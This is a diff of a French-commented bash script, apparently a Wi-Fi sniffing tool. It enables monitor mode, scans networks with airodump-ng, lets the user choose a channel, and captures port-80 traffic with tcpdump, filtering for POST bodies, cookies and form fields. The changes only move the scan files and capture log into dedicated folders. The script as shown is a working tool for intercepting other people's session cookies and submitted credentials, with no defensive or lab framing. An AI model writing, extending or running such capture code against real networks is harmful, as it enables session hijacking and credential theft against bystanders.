@@ -57,12 +57,16 @@ else
     log "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
 fi
 
+# Création du dossier captures s'il n'existe pas
+CAPTURES_DIR="$SCRIPT_DIR/captures"
+mkdir -p "$CAPTURES_DIR"
+
 # Supprime les anciens fichiers de scan
-rm -f networks-01.csv
+rm -f "$CAPTURES_DIR/networks-"*.csv
 
 # Scan des réseaux Wi-Fi avec `airodump-ng`
 log "[🔍] Scan des réseaux Wi-Fi en cours..."
-sudo airodump-ng --output-format csv -w networks "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &
+sudo airodump-ng --output-format csv -w "$CAPTURES_DIR/networks" "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &
 
 # Effet de chargement (7 secondes)
 log -ne "[🔄] Attente du scan"
@@ -76,7 +80,7 @@ log ""
 sudo pkill airodump-ng
 
 # Vérifie si le fichier de scan a été généré
-if [ ! -f networks-01.csv ]; then
+if [ ! -f "$CAPTURES_DIR/networks-01.csv" ]; then
     log "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
     exit 1
 fi
@@ -103,7 +107,7 @@ NR>2 {
     }
 
     printf "Canal: %-3s | Sécurité: %-4s | SSID: %s\n", canal, security, ssid
-}' networks-01.csv | column -t
+}' "$CAPTURES_DIR/networks-01.csv" | column -t
 
 # Demande à l'utilisateur de choisir un canal
 log ""
@@ -115,5 +119,5 @@ log "[✅] Surveillance du canal $CANAL..."
 
 # Lancer la capture avec tcpdump pour capturer toutes les requêtes POST
 log "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
-sudo tcpdump -i "$MONITOR_INTERFACE" -A -s 0 port 80 | grep -E "POST|Host:|User-Agent:|Content-Length:|Content-Type:|Referer:|Cookie:|=|&" | tee capture.log
+sudo tcpdump -i "$MONITOR_INTERFACE" -A -s 0 port 80 | grep -E "POST|Host:|User-Agent:|Content-Length:|Content-Type:|Referer:|Cookie:|=|&" | tee "$LOG_DIR/capture.log"
 
